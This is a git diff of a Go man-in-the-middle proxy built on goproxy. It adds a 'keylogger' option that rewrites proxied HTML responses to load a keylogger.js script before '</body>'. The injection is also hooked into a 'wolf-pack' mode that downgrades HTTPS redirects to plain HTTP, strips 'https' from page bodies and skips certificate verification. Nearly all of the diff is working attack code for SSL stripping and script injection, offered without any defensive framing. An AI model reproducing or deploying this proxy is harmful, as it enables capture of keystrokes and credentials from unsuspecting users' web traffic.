@@ -26,17 +26,19 @@ const (
     CONN_HOST = "localhost"
     CONN_PORT = "8080"
     CONN_TYPE = "tcp"
+
+    INJECT_LOGGER_REPLACE = "</body>"
+    INJECT_LOGGER_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
 )
 
-// var listOfUsers map[string]struct{}
 var listener net.Listener
-// var proxy *goproxy.ProxyHttpServer
 
 // Provide booleans for each function
 var globalStoreHAR bool
 var globalRedirects bool
 var globalBlocks bool
 var globalWolfPack bool
+var globalInjectKeyLogger bool
 
 
 // -----------------------------------------------------------------------------------------
@@ -48,13 +50,14 @@ func StartSimpleProxy() net.Listener {
     globalStoreHAR = false
 
     log.Println(" >>> STARTING PROXY SERVER")
-    log.Println("     --- OPTION storing HAR ", globalStoreHAR)
-    log.Println("     --- OPTION redirection ", globalRedirects)
-    log.Println("     --- OPTION blocking ", globalBlocks)
-    log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack)
+    log.Println("     --- OPTION storing HAR ", globalStoreHAR )
+    log.Println("     --- OPTION redirection ", globalRedirects )
+    log.Println("     --- OPTION blocking ", globalBlocks )
+    log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack )
+    log.Println("     --- OPTION inject key logger ", globalInjectKeyLogger )
     
     // Start the listener to listen on the connection.
-    listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
+    listener, _ = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT)
     // Start the proxy.
     proxy := goproxy.NewProxyHttpServer()
 
@@ -115,10 +118,100 @@ func StartSimpleProxy() net.Listener {
     // We want to make sure that if a page redirects to https using a 301 or 302 we mitm that connection.
     // Handle the SERVER-RESPONSE
     if globalWolfPack {
+        
         interceptResponse := TriggerWolfPack()
-        proxy.HandleResponse((interceptResponse))
+        proxy.HandleResponse(interceptResponse)
+        //proxy.HandleResponse((interceptResponse))
+
+        // proxy.HandleResponseFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
+
+        //     // Check if the SERVER-RESPOSE is actually giving us a 301/302 redirection.
+        //     if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
+                
+        //         // Check if we are directed to an HTTPS page
+        //         // Then we kill the original request, and make the connection ourself
+        //         if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {
+
+        //             log.Println(" *** ---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
+        //             log.Println(" *** <<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
+
+        //             ctx.Resp.Request.URL.Scheme = "http"
+        //             ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
+        //             ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)
+
+        //             tr := &http.Transport{
+        //                 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        //             }
+        //             client := &http.Client{Transport: tr}
+        //             server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
+        //             if err != nil {
+        //                 log.Println(" help!: ", err)
+        //             }
+        //             log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
+
+        //             log.Println(server_ssl_response.TLS)
+        //             bs, err := ioutil.ReadAll(server_ssl_response.Body)
+        //             if err != nil {
+        //                 log.Println(err)
+        //             }
+        //             body := string(bs)
+        //             body = strings.Replace(body, "https", "http", -1)
+        //             // Create a response object from the body.
+        //             client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
+        //             ctx.Resp = client_response
+        //             return goproxy.FORWARD
+
+        //         } else { // if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
+        //             // Redirecting to some HTTP page.
+        //             log.Println("Response is HTTP")
+        //             bs, err := ioutil.ReadAll(ctx.Resp.Body)
+        //             if err != nil {
+        //                 log.Println(err)
+        //             }
+        //             body := string(bs)
+        //             // strip all https out of the page so that a redirect will be required if necessary
+        //             body = strings.Replace(body, "https", "http", -1)
+        //             ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+        //             return goproxy.NEXT
+        //         }
+
+        //     } // end of 301-302 redirects.
+
+
+        //     // log.Println("neither of the above, we are forwarding data")
+        //     // if strings.Contains(ctx.Resp.Request.URL.Path, "js") { 
+        //     //     //catch javascript files to embed the hook into
+        //     //     log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
+        //     // } else if strings.Contains(ctx.Resp.Request.URL.Path, "css") { 
+        //     //     //catch css and leave it alone
+        //     // } else { //must be an html file or a picture or whatever.
+        //     //     bs, err := ioutil.ReadAll(ctx.Resp.Body)
+        //     //     if err != nil {
+        //     //         log.Println(err)
+        //     //     }
+        //     //     body := string(bs)
+        //     //     body = strings.Replace(body, "https", "http", -1) //stip all https tags
+        //     //     //need to inject javascript aswell
+        //     //     ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+        //     // }
+
+        //     return goproxy.NEXT
+        // })
     } else {
-        proxy.HandleResponseFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
+        // proxy.HandleResponseFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
+        //     if globalStoreHAR {
+        //         log.Println(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
+        //         ctx.LogToHARFile(true)
+        //         t := time.Now().Local()
+        //         timestamp := t.Format("20060102150405")
+        //         proxy.FlushHARToDisk(fileLocation+"/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
+        //     } else {
+        //         log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
+        //     }
+        //     return goproxy.NEXT
+        // })
+        interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
+            // Log HAR files.
             if globalStoreHAR {
                 log.Println(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
                 ctx.LogToHARFile(true)
@@ -128,8 +221,20 @@ func StartSimpleProxy() net.Listener {
             } else {
                 log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
             }
+            //
+            bs, err := ioutil.ReadAll(ctx.Resp.Body)
+            if err != nil {
+               log.Println("inject error: ", err)
+            }
+            body := string(bs) //needs to be a string for reading
+            if globalInjectKeyLogger {
+                log.Println("INJECTING")
+                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+            }
+            ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
             return goproxy.NEXT
         })
+        proxy.HandleResponse(interceptResponse)
     }
 
     go http.Serve(listener, proxy)
@@ -206,6 +311,10 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 }
                 body := string(bs)
                 body = strings.Replace(body, "https", "http", -1)
+                if globalInjectKeyLogger {
+                    // log.Println("INJECTING")
+                    body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+                }
                 // Create a response object from the body.
                 client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
                 ctx.Resp = client_response
@@ -221,6 +330,10 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 body := string(bs)
                 // strip all https out of the page so that a redirect will be required if necessary
                 body = strings.Replace(body, "https", "http", -1)
+                if globalInjectKeyLogger {
+                    // log.Println("INJECTING")
+                    body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+                }
                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
                 return goproxy.NEXT
             }
@@ -281,46 +394,6 @@ func TriggerWolfPack() goproxy.HandlerFunc {
 
 
 
-
-// //ERROR: want to inject code, but crashes out at the moment
-// func InjectScript(replace string, result string) net.Listener {
-//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
-//     proxy := goproxy.NewProxyHttpServer()
-//     log.Println("replace: ", replace)
-//     log.Println("result: ", result)
-//     //inject jquery always...
-//     // result = "<script src=\"http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js\"></script>"+result
-//     interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-
-//         // proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
-
-//         // log.Println("URL: ", ctx.Resp.Request.URL)
-//             // log.Println("page: ", ctx.Req.URL.Path)
-//             // if strings.Contains(ctx.Req.URL.Path, "/") {
-//                 log.Println("found: ", ctx.Req.URL.Path)
-//                 //start reading the response for editing
-//                 bs, err := ioutil.ReadAll(ctx.Resp.Body)
-//                 if err != nil {
-//                    log.Println("inject error: ", err)
-//                 }
-//                 body := string(bs) //needs to be a string for reading
-//                 body = injector(body, replace, result)
-
-//                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
-//             // }
-
-//             return goproxy.NEXT
-//         })
-//     proxy.HandleResponse(interceptResponse)
-//     go http.Serve(listener, proxy) // you can probably ignore this error
-//     return listener
-// }
-
-// func injector(body string, replace string, result string) string {
-//     body = strings.Replace(body, replace, result, -1)
-//     // log.Println("injected: ", body)
-//     return body
-// }
 
 // func FlipImages() net.Listener {
 //     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
